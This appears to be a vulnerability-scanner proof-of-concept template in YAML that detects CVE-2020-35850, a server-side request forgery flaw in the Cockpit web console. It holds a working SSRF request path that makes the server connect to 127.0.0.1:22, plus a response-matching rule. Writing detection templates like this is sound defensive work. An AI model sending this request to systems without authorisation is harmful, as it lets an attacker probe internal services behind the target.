name: yaml-poc-cockpit-project-cockpit-ssrf-CVE-2020-35850
binding: e1bf7e97-9a38-43c5-a708-2b6d517319ba
detail:
    author: haiqing.chen
    links:
        - https://github.com/cockpit-project/cockpit/issues/15077
        - https://github.com/passtheticket/vulnerability-research/blob/main/cockpitProject/README.md
        - https://nvd.nist.gov/vuln/detail/CVE-2020-35850
    vulnerability:
        id: 0c04117d-8b24-4d4f-90b2-a66e7530e34a
        level: medium
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cockpit+=127.0.0.1:22/login
            follow_redirects: true
        expression: response.status == 401 && response.body_string.contains("/cockpit/static/") && response.body_string.contains("Authentication failed")
expression: r0()
